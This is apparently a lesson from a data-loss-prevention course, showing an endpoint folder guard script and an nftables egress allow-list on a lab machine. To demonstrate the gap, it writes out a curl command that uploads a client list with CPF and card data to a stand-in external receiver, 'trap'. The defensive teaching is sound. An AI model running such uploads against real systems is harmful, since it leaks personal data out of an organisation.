---
title: On the endpoint and on the network
version: 1
---

**A DLP control sits either where the action happens or where the traffic passes, and the two see
different things.** On the endpoint, the file is still readable and the action has a name: this
person is copying this file to this folder. On the network, the traffic is usually encrypted, but
every machine's traffic passes the same few points, and a rule there needs no agent on anybody's
laptop. A firm that cares does both.

## On the endpoint: a guard on the outbox

Most laptops have a folder that a sync client uploads, and whatever lands there leaves the firm in
seconds. An endpoint agent watches the moment a file arrives, checks it, and holds it back if it
carries personal data. This one does the same with the scanner you already have. Save it on `desk`
as `guard.sh`:

```schooling-example
{"language": "sh", "file": "guard.sh", "parts": [{"code": "#!/bin/bash\n# guard.sh: hold back any file put in ~/outbox that carries personal data.\nOUT=$HOME/outbox\nHELD=$HOME/held\nmkdir -p \"$OUT\" \"$HELD\"", "note": "`~/outbox` stands for the folder a sync client uploads, the kind every company laptop has. Whatever lands there leaves the company within seconds, so it is where an endpoint DLP agent watches."}, {"code": "inotifywait -m -q -e close_write -e moved_to --format '%f' \"$OUT\" | while read -r name; do", "note": "`inotifywait` is told by the kernel each time a file in the folder is finished being written or is moved in, so the check happens at the moment of the action rather than on a schedule."}, {"code": "  found=$(python3 \"$HOME/scan.py\" \"$OUT/$name\")\n  if [ -n \"$found\" ]; then\n    mv \"$OUT/$name\" \"$HELD/\"\n    logger -t dlp \"held $name: ${found#*: }\"\n  fi\ndone", "note": "A file the scanner has anything to say about is moved to `~/held` before the sync client gets to it, and a line goes to the system log with the scanner's masked summary. Nothing is deleted: a held file waits for a person to decide."}]}
```

Start it as a service of its own, running as you:

```
ana@desk:~$ sudo systemd-run --uid=ana --unit dlp-guard bash ~/guard.sh
Running as unit: dlp-guard.service; invocation ID: cabf488a79354fb9b99a8619bb777435
```

Then put two files in the outbox, the memo and the client list:

```
ana@desk:~$ sleep 1; cp docs/memo.txt docs/clientes.csv outbox/; sleep 1; ls outbox held
held:
clientes.csv

outbox:
memo.txt
ana@desk:~$ sudo journalctl -t dlp -o cat --no-pager
held clientes.csv: 20 CPF, 20 card, 0 rejected, e.g. 881******41
```

The memo stayed in the outbox, where a sync client would pick it up. The client list was moved to
`held` before anything could, and the log says why, in the scanner's masked words. **This is the
whole shape of endpoint DLP**: a hook on an action, a content check, and a decision, all before the
data leaves. A product hooks many more actions than one folder, such as a paste into a browser, a
print, or a copy to a USB stick, and it does it from the kernel, as lesson 8 described; the
decision is the same.

## On the network: where data may go at all

A content check needs a file it can read. **A destination rule needs only an address**, and it works
whatever the data is and however it is encrypted. Before writing one, see what `desk` can do
without it. On `trap`, open a shell and start this small receiver, which stands for any site outside
the firm that accepts uploads:

```schooling-example
{"language": "python", "file": "recv.py", "parts": [{"code": "#!/usr/bin/env python3\n\"\"\"recv.py: accept any upload and say how many bytes arrived. It stands in for a site outside the company.\"\"\"\nimport http.server\n\nclass Recv(http.server.BaseHTTPRequestHandler):\n    def do_PUT(self):\n        size = len(self.rfile.read(int(self.headers[\"Content-Length\"])))\n        self.send_response(201)\n        self.end_headers()\n        self.wfile.write(f\"received {size} bytes\\n\".encode())\n\nhttp.server.HTTPServer((\"0.0.0.0\", 8443), Recv).serve_forever()", "note": "Ten lines that accept an HTTP `PUT` of any file and throw it away after counting it. On `trap` it plays the part of every place outside the company a file could be sent to: a personal mailbox, a file-sharing site, a competitor."}]}
```

```sh
python3 recv.py
```

Leave it running there. From `desk`, send it the client list:

```
ana@desk:~$ curl -s -T docs/clientes.csv http://trap:8443/
received 951 bytes
```

All 951 bytes of the file arrived. The guard never saw it, because `curl` read the file from `docs`,
not from the outbox: **an endpoint check covers the actions it hooks and nothing else.** So the
network gets a rule of its own. `desk`'s job needs the portal and the name server; save this as
`egress.nft`:

```schooling-example
{"language": "conf", "file": "egress.nft", "parts": [{"code": "table inet egress {\n\tchain output {\n\t\ttype filter hook output priority filter; policy drop;\n\t\toif \"lo\" accept\n\t\tct state established,related accept\n\t\tip daddr 192.168.60.10 tcp dport { 80, 443 } accept\n\t\tip daddr 192.168.60.53 udp dport 53 accept\n\t\tcounter drop comment \"everything else\"\n\t}\n}", "note": "An allow-list for what `desk` may start a conversation with: the portal on `web`, the name server, and replies to conversations somebody else started, such as your SSH sessions. Every other new connection is dropped and counted."}]}
```

Load it and try both destinations again:

```
ana@desk:~$ sudo nft -f egress.nft
ana@desk:~$ curl -s -m 3 -T docs/clientes.csv http://trap:8443/; echo "exit $?"
exit 28
ana@desk:~$ curl -s -m 3 http://web/
Jatobá Contabilidade: client portal
ana@desk:~$ sudo nft list chain inet egress output | grep counter
		counter packets 3 bytes 180 drop comment "everything else"
```

The upload to `trap` waited three seconds and gave up, `exit 28`, while the portal still answered.
The counter shows the packets the rule dropped: every retry of the connection `curl` tried to open.
Nothing in the rule knows what the file was, and nothing needs to. **An allow-list of destinations
is the cheapest DLP control there is**, and lesson 10 makes it the general rule for servers.

Its limit is the same as its strength: it knows addresses and not data. The portal on `web` is
allowed, so a file posted to a form on the portal would pass. That is where the content check, on
the endpoint or on a gateway that can read the traffic, earns its place again.

```schooling-figure
{"svg": "<svg viewBox=\"0 0 720 250\" role=\"img\" data-fig=\"l09-two-layers\" aria-label=\"Two controls on desk. Top: a file copied into the outbox meets the guard, which runs the scanner and moves the client list to held, so the sync client never sees it. Bottom: curl reads the same file from docs, never passing the guard, and sends it towards trap; the egress rule drops it, while traffic to the portal on web is allowed.\"><defs><marker id=\"l09-two-layers-dh-ah-amber\" viewBox=\"0 0 10 8\" refX=\"9\" refY=\"4\" markerWidth=\"8\" markerHeight=\"7\" orient=\"auto-start-reverse\"><path d=\"M0 0 L10 4 L0 8 z\" fill=\"var(--amber)\"></path></marker><marker id=\"l09-two-layers-dh-ah-paper-dim\" viewBox=\"0 0 10 8\" refX=\"9\" refY=\"4\" markerWidth=\"8\" markerHeight=\"7\" orient=\"auto-start-reverse\"><path d=\"M0 0 L10 4 L0 8 z\" fill=\"var(--paper-dim)\"></path></marker></defs><text x=\"20.0\" y=\"30.0\" text-anchor=\"start\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Sans', sans-serif\" font-size=\"10.5\" font-weight=\"600\" fill=\"var(--paper-dim)\">on the endpoint: the content</text><rect x=\"20.0\" y=\"50.0\" width=\"130.0\" height=\"40.0\" rx=\"3\" fill=\"var(--panel)\" stroke=\"var(--wire)\" stroke-width=\"1.3\"></rect><text x=\"85.0\" y=\"70.0\" text-anchor=\"middle\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Mono', monospace\" font-size=\"10\" fill=\"var(--paper)\">outbox/</text><rect x=\"210.0\" y=\"50.0\" width=\"170.0\" height=\"40.0\" rx=\"3\" fill=\"var(--panel)\" stroke=\"var(--phosphor)\" stroke-width=\"1.5\"></rect><text x=\"295.0\" y=\"70.0\" text-anchor=\"middle\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Sans', sans-serif\" font-size=\"10\" fill=\"var(--paper)\">guard: scan.py</text><rect x=\"450.0\" y=\"50.0\" width=\"110.0\" height=\"40.0\" rx=\"3\" fill=\"var(--panel)\" stroke=\"var(--amber)\" stroke-width=\"1.3\"></rect><text x=\"505.0\" y=\"70.0\" text-anchor=\"middle\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Mono', monospace\" font-size=\"10\" fill=\"var(--paper)\">held/</text><path d=\"M150.0 70.0 L210.0 70.0\" stroke=\"var(--paper-dim)\" stroke-width=\"1.3\" fill=\"none\" marker-end=\"url(#l09-two-layers-dh-ah-paper-dim)\"></path><path d=\"M380.0 70.0 L450.0 70.0\" stroke=\"var(--amber)\" stroke-width=\"1.3\" fill=\"none\" marker-end=\"url(#l09-two-layers-dh-ah-amber)\"></path><text x=\"415.0\" y=\"98.0\" text-anchor=\"middle\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Sans', sans-serif\" font-size=\"9\" fill=\"var(--amber)\">personal data</text><text x=\"20.0\" y=\"140.0\" text-anchor=\"start\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Sans', sans-serif\" font-size=\"10.5\" font-weight=\"600\" fill=\"var(--paper-dim)\">on the network: the destination</text><rect x=\"20.0\" y=\"160.0\" width=\"130.0\" height=\"40.0\" rx=\"3\" fill=\"var(--panel)\" stroke=\"var(--wire)\" stroke-width=\"1.3\"></rect><text x=\"85.0\" y=\"180.0\" text-anchor=\"middle\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Mono', monospace\" font-size=\"10\" fill=\"var(--paper)\">curl -T docs/…</text><rect x=\"210.0\" y=\"160.0\" width=\"170.0\" height=\"40.0\" rx=\"3\" fill=\"var(--panel)\" stroke=\"var(--phosphor)\" stroke-width=\"1.5\"></rect><text x=\"295.0\" y=\"180.0\" text-anchor=\"middle\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Sans', sans-serif\" font-size=\"10\" fill=\"var(--paper)\">egress allow-list</text><rect x=\"450.0\" y=\"140.0\" width=\"110.0\" height=\"34.0\" rx=\"3\" fill=\"var(--panel)\" stroke=\"var(--wire)\" stroke-width=\"1.3\"></rect><text x=\"505.0\" y=\"157.0\" text-anchor=\"middle\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Sans', sans-serif\" font-size=\"9.5\" fill=\"var(--paper)\">web: allowed</text><rect x=\"450.0\" y=\"190.0\" width=\"110.0\" height=\"34.0\" rx=\"3\" fill=\"var(--panel)\" stroke=\"var(--amber)\" stroke-width=\"1.3\" stroke-dasharray=\"5 3\"></rect><text x=\"505.0\" y=\"207.0\" text-anchor=\"middle\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Sans', sans-serif\" font-size=\"9.5\" fill=\"var(--amber)\">trap: dropped</text><path d=\"M150.0 180.0 L210.0 180.0\" stroke=\"var(--paper-dim)\" stroke-width=\"1.3\" fill=\"none\" marker-end=\"url(#l09-two-layers-dh-ah-paper-dim)\"></path><path d=\"M380.0 172.0 L450.0 157.0\" stroke=\"var(--paper-dim)\" stroke-width=\"1.3\" fill=\"none\" marker-end=\"url(#l09-two-layers-dh-ah-paper-dim)\"></path><path d=\"M380.0 188.0 L450.0 207.0\" stroke=\"var(--amber)\" stroke-width=\"1.3\" fill=\"none\" marker-end=\"url(#l09-two-layers-dh-ah-amber)\"></path><text x=\"640.0\" y=\"120.0\" text-anchor=\"middle\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Sans', sans-serif\" font-size=\"9.5\" fill=\"var(--paper-dim)\">the upload never</text><text x=\"640.0\" y=\"135.0\" text-anchor=\"middle\" dominant-baseline=\"middle\" font-family=\"'IBM Plex Sans', sans-serif\" font-size=\"9.5\" fill=\"var(--paper-dim)\">passed the guard</text></svg>", "caption": "The guard reads what goes into one folder. The allow-list reads only where traffic goes."}
```
